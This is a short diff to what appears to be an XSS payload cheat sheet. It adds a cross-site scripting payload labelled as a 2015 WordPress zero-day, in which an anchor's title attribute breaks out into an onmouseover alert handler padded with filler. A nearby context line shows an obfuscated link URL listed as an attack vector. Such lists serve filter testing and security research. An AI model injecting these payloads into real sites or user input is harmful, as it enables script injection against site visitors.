@@ -344,3 +344,6 @@ JavaScript link location:
 
 Content replace as attack vector
 <A HREF="http://www.gohttp://www.google.com/ogle.com/">XSS</A>
+
+WP zero day exploit 2015-04-27
+<a title='x onmouseover=alert(unescape(/hello%20world/.source))  style=position:absolute;left:0;top:0;width:5000px;height:5000px  AAAAAAAAAAAA [64 kb] ...'>
